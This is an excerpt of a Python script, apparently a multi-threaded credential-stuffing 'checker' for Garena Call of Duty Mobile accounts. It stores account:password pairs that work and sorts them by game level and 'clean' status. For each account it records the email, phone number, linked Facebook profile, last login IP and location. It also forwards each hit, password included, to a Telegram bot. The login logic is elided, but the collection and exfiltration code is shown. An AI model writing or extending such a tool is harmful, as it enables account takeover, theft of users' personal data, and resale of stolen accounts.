...
def signal_handler(signum, frame):
    ...
    print(f"  {Colors.WHITE}   Thanks for using my codm checker!{Colors.RESET}")
    print(f"  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
    print()
    os._exit(0)
...
class LiveStats:
    ...
    def display_stats(self):
        ...
        return (
            f"\n{cyan}╔═══════════════════════════════════════════════════════════════════╗{reset}\n"
            f"{cyan}║{reset}  {yellow}LIVE STATISTICS{reset} {gray}|{reset} {white}                       {cyan}║{reset}\n"
            f"{cyan}╠═══════════════════════════════════════════════════════════════════╣{reset}\n"
...
def save_codm_account(account, password, codm_info, country='N/A', is_clean=False, result_folder='Results'):
    """Save CODM account with DETAILED format"""
    try:
        if not codm_info:
            return
        ...
        if codm_level <= 50: level_range = "1-50"
        elif codm_level <= 100: level_range = "51-100"
        elif codm_level <= 150: level_range = "101-150"
        elif codm_level <= 200: level_range = "151-200"
        elif codm_level <= 250: level_range = "201-250"
        elif codm_level <= 300: level_range = "251-300"
        elif codm_level <= 350: level_range = "301-350"
        else: level_range = "351+"
...
📍 Last Login From: N/A
🌐 Last Login IP: N/A
🗺️ Last Login Country: N/A

📊 Account Status: ✅ {"CLEAN" if is_clean else "NOT CLEAN"}
...
def save_clean_or_notclean(account, password, details, codm_info, result_folder='Results'):
    """Save ONLY CODM accounts to organized CODM folders (no clean.txt/notclean.txt)"""
    try:
        # ONLY SAVE IF HAS CODM
        if not codm_info or not codm_info.get('codm_nickname') or codm_info.get('codm_nickname') == 'N/A':
            return
        ...
        fb_linked = "Linked" if fb_account else "Not Linked"
        fb_uid = fb_account.get('fb_uid', 'N/A') if isinstance(fb_account, dict) else "N/A"
        fb_link = f"https://facebook.com/{fb_uid}" if fb_linked == "Linked" else "N/A"
        
        # Last login info
        last_login = details.get('last_login', 'N/A')
        last_login_where = details.get('last_login_where', 'N/A')
        last_login_ip = details.get('ip_for_msg', 'N/A')
        
        is_clean = details.get('is_clean', False)
        
        # Determine country
        country_code = acc_country.upper() if acc_country and acc_country != 'N/A' else 'UNKNOWN'
        
        # Determine level range
        try:
            lvl_int = int(codm_level) if str(codm_level).isdigit() else 0
        except:
            lvl_int = 0
            
        if lvl_int <= 50: level_range = "1-50"
        elif lvl_int <= 100: level_range = "51-100"
        elif lvl_int <= 150: level_range = "101-150"
        elif lvl_int <= 200: level_range = "151-200"
        elif lvl_int <= 250: level_range = "201-250"
        elif lvl_int <= 300: level_range = "251-300"
        elif lvl_int <= 350: level_range = "301-350"
        else: level_range = "351+"
...
💰 Garena Shell: {shell}
📧 Email: {masked_email} ({email_ver})
📞 Mobile: {mobile if mobile and mobile != 'N/A' else 'N/A'}
🌍 Country: {acc_country}
👤 Nickname: {details.get('nickname', 'N/A')}

--- Facebook Information ---
👤 Facebook Username: {fb_uid if fb_linked == 'Linked' else 'N/A'}
🔗 Facebook Link: {fb_link}
📌 Facebook Status: {fb_linked}
...
🗺️ Last Login Country: {acc_country}
...
#  {Colors.WHITE}CONFIG BY: @xeryzs{Colors.RESET}
        if not BOT_MODE:
            print(mess)
                ...
                # ── Telegram notification (DETAILED format) ──
            ...
            try:
                ...
                if _tg_token and _tg_chat:
                    ...
                    if _level_ok and _clean_ok:
                        # Get Facebook info
                        fb_account = details.get('security', {}).get('facebook_account') or {}
                        fb_linked = "CONNECTED" if fb_account else "NOT CONNECTED"
                        fb_uid = fb_account.get('fb_uid', '') if isinstance(fb_account, dict) else ''
                        fb_link = f"https://facebook.com/{fb_uid}" if fb_uid else 'N/A'
                        fb_username = fb_account.get('fb_username', '') if isinstance(fb_account, dict) else ''
                        ...
                        if details.get('is_clean'):
                            ...
                            status_emoji = "⚠️ NOT CLEAN"
                        
                        _tg_msg = f"""============================================================
📱 Account: {account} : {password}
🆔 UID: {details.get('uid', 'N/A')}
💰 Garena Shell: {shell}
📧 Email: {masked_email} ({'Verified' if email_verified_flag else 'Not Verified'})
📞 Mobile: {mobile if mobile and mobile != 'N/A' else 'N/A'}
🌍 Country: {acc_country}
👤 Nickname: {details.get('nickname', 'N/A')}

--- Facebook Information ---
👤 Facebook Username: {fb_username if fb_username else 'N/A'}
🔗 Facebook Link: {fb_link}
📌 Facebook Status: {fb_linked}
...
--- Login History ---
🕐 Last Login: {details.get('last_login', 'N/A')}
📍 Last Login From: {details.get('last_login_where', 'N/A')}
🌐 Last Login IP: {details.get('ip_for_msg', 'N/A')}
🗺️ Last Login Country: {acc_country}

📊 Account Status: {status_emoji}
...
def main():
    ...
    try:
        ...
        MAX_THREADS = max(1, min(50, int(thread_input))) if thread_input.isdigit() else 50
    except Exception:
        MAX_THREADS = 50
